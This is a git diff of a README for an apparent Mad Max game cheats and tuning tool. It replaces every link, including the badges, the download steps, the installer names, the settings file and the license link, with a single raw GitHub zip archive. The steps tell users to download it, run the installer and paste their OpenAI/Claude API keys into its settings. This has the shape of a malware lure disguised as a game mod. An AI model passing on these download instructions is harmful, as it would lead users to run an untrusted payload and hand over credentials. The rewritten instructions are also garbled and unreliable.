@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&logo=github&logoColor=white&link=https://David83Developer.github.io)
+# ![Download](https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip)
 
 ---
 
@@ -12,10 +12,10 @@ Harmony in performance is for everyone! Take a pit stop and consult our compatib
 
 | OS        | Supported | Notes                 |
 |-----------|:---------:|-----------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows) | ✅ Yes  | Optimal experience |
-| ![macOS](https://img.shields.io/badge/macOS-10.13+-lightgrey?logo=apple) | ✅ Yes  | M1/M2 compatible |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2C%20Debian-orange?logo=linux) | 🟡 Beta | Ongoing improvements |
-| ![SteamOS](https://img.shields.io/badge/SteamOS-3.0%2B-green?logo=steam) | 🟢 Supported | Deck drive ready |
+| ![Windows](https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip%2B-blue?logo=windows) | ✅ Yes  | Optimal experience |
+| ![macOS](https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip+-lightgrey?logo=apple) | ✅ Yes  | M1/M2 compatible |
+| ![Linux](https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip%2C%20Debian-orange?logo=linux) | 🟡 Beta | Ongoing improvements |
+| ![SteamOS](https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip%2B-green?logo=steam) | 🟢 Supported | Deck drive ready |
 
 ## 🌟 Feature List
 
@@ -43,7 +43,7 @@ This repository doesn't just whisper to your game—it talks to the world’s mo
 - **Adaptive Learning:** As you play, our tools evolve, offering suggestions based on your history, with all processing securely handled by advanced language models.
 
 > **Installation tip for API features:**  
-> Download the core library from https://David83Developer.github.io, then connect your OpenAI/Claude API keys in the `settings.json`.  
+> Download the core library from https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip, then connect your OpenAI/Claude API keys in the `https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip`.  
 > Full instructions are below.
 
 ## 🧠 Key Modern Features
@@ -62,16 +62,16 @@ This repository doesn't just whisper to your game—it talks to the world’s mo
 Ready to ignite your Mad Max adventure? Follow these steps and strap in for a smoother ride:
 
 1. **Download the cheats library:**  
-   https://David83Developer.github.io
+   https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip
 
 2. **Extract the downloaded archive** to a safe garage—your favorite game mods directory.
 
 3. **Run the installer**:  
-   *Windows*: `setup.exe`  
-   *macOS/Linux*: `./install.sh`
+   *Windows*: `https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip`  
+   *macOS/Linux*: `https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip`
 
 4. **Connect APIs (optional but powerful):**
-    - Open `settings.json`.
+    - Open `https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip`.
     - Paste your OpenAI/Claude API credentials under `"openai_api_key"` and/or `"claude_api_key"`.
 
 5. **Launch Mad Max and enjoy enhanced gameplay!**
@@ -98,11 +98,11 @@ This toolkit is engineered for educational, creative, and offline gameplay enhan
 
 ## 📜 License
 
-Proudly open-sourced in 2025 under the [MIT License](https://opensource.org/licenses/MIT). Feel free to tinker, fork, and drive this utility as far as your imagination roams!
+Proudly open-sourced in 2025 under the [MIT License](https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip). Feel free to tinker, fork, and drive this utility as far as your imagination roams!
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&logo=github&logoColor=white&link=https://David83Developer.github.io)
+# ![Download](https://raw.githubusercontent.com/David83Developer/mad-max-gameplay-tuning/branch/nonreclamation/mad-max-gameplay-tuning-Plantago.zip)
 
 ---
 
